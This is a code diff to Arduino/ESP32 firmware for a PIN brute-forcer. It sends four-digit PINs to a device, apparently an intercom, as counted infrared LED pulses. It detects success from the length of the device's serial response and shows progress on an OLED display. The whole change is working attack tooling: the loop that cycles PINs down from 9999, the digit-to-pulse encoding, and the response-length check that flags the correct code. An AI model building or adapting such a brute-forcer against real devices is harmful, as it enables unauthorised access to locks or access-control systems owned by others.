@@ -1,6 +1,5 @@
 #include <Arduino.h>
 #include <SPI.h>
-#include "intercom.h"
 #include <Wire.h>
 #include "SSD1306Wire.h"
 
@@ -12,9 +11,12 @@ SSD1306Wire display(0x3c, SDA, SCL);  // ADDRESS, SDA, SCL
 #define IR_TX_NOT_RELEVANT 5
 // ------------------------------
 
+#include "readMessage.h"
+
+
 // PIN CONFIGURATION ------------
-#define PIN_DIRECTION 1
-#define START_PIN 0
+#define PIN_DIRECTION -1
+#define START_PIN 9999
 #define MAX_PIN 9999
 #define MIN_PIN 0
 // ------------------------------
@@ -30,21 +32,36 @@ int pinDirection = PIN_DIRECTION;
 int pin = START_PIN - PIN_DIRECTION;
 bool pinFound = false;
 int referenceMessageLength = 0;
+int lastMessageLength = 0;
 
 void setup() {
     Serial.begin(115200);
     Serial.println("Starting...");
 
-    customSerial.begin(9600, SERIAL_8N1, IR_RX, IR_TX_NOT_RELEVANT); // RX on GPIO 4, TX on GPIO 14
-
-    referenceMessageLength = getMessageLength();
+    pinMode(IR_TX, OUTPUT);
+    digitalWrite(IR_TX, LOW);
 
     display.init();
     display.flipScreenVertically();
     display.setFont(ArialMT_Plain_16);
     display.setTextAlignment(TEXT_ALIGN_LEFT);
 
-    pinMode(IR_TX, OUTPUT);
+    display.clear();
+    display.drawString(0, 0, "Starting...");
+    display.display();
+
+    customSerial.begin(9600, SERIAL_8N1, IR_RX, IR_TX_NOT_RELEVANT); // RX on GPIO 4, TX on GPIO 14
+
+    referenceMessageLength = getMaximumMessageLength();
+    lastMessageLength = referenceMessageLength;
+
+    display.clear();
+    display.drawString(0, 0, "Ref length: " + String(referenceMessageLength));
+    display.setFont(ArialMT_Plain_10);
+    display.drawString(0, 20, "Wait for initial input");
+    display.display();
+
+    delay(1000 + 3100 * 4);
 }
 
 void nextPin() {
@@ -61,71 +78,50 @@ void nextPin() {
 
 void makePulse() {
     digitalWrite(IR_TX, HIGH);
-    delay(100);
+    delay(250);
     digitalWrite(IR_TX, LOW);
-    delay(200);
+    delay(250);
 }
 
 void initPinInput() {
+    delay(800);
+
     // flash the LED to start a new number with the display test.
     makePulse();
     // flash the LED to go to PIN input.
-    makePulse();
+    // makePulse();
+
+    delay(4000);
 }
 
 void sendPin(int pin) {
+    display.clear();
+    display.drawString(0, 0, "Start PIN input...");
+    display.drawString(0, 20, "Pin: " + String(pin));
+    display.display();
+
     initPinInput();
 
     char formattedPin[5];
     sprintf(formattedPin, "%04d", pin);
 
+
     for (int i = 0; i < 4; i++) {
         int digit = formattedPin[i] - '0';
+
+        display.clear();
+        display.setFont(ArialMT_Plain_16);
+        display.drawString(0, 0, "Brute forcing pin...");
+        display.drawString(0, 20, "Pin: " + String(formattedPin));
+        display.setFont(ArialMT_Plain_10);
+        display.drawString(0, 50, "Sending digit #" + String(i + 1) + "/4 (" + String(digit) + ")");
+        display.display();
+
         for (int j = 0; j < digit; j++) {
             makePulse();
         }
         delay(3100);
     }
-}
-
-int getMessageLength() {
-    int old = 0;
-
-    // Reset input buffer
-    customSerial.flush();
-    delay(100);
-
-    // Get new input buffer size
-    int new_size = customSerial.available();
-
-    if (new_size > 0) {
-        // Wait for complete data messages
-        while (old < new_size) {
-            delay(100);
-            old = new_size;
-            new_size = customSerial.available();
-        }
-
-        old = 0;
-        new_size = 0;
-        customSerial.flush();
-    }
-
-    // Wait until data is received
-    while (old == new_size) {
-        delay(100);
-        old = new_size;
-        new_size = customSerial.available();
-    }
-
-    // Wait for complete data messages
-    while (old < new_size) {
-        delay(100);
-        old = new_size;
-        new_size = customSerial.available();
-    }
-
-    return new_size;
 }
 
 void loop() {
@@ -141,16 +137,20 @@ void loop() {
     Serial.println("Brute forcing pin: " + String(pin));
 
     display.clear();
+    display.setFont(ArialMT_Plain_16);
     display.drawString(0, 0, "Brute forcing pin...");
 
     char formattedPin[5];
     sprintf(formattedPin, "%04d", pin);
     display.drawString(0, 20, "Pin: " + String(formattedPin));
+    display.setFont(ArialMT_Plain_10);
+    display.drawString(0, 50, String(referenceMessageLength) + " -> " + String(lastMessageLength));
     display.display();
 
     sendPin(pin);
 
-    int messageLength = getMessageLength();
+    int messageLength = getMaximumMessageLength();
+    lastMessageLength = messageLength;
     if (messageLength > referenceMessageLength) {
         pinFound = true;
     }
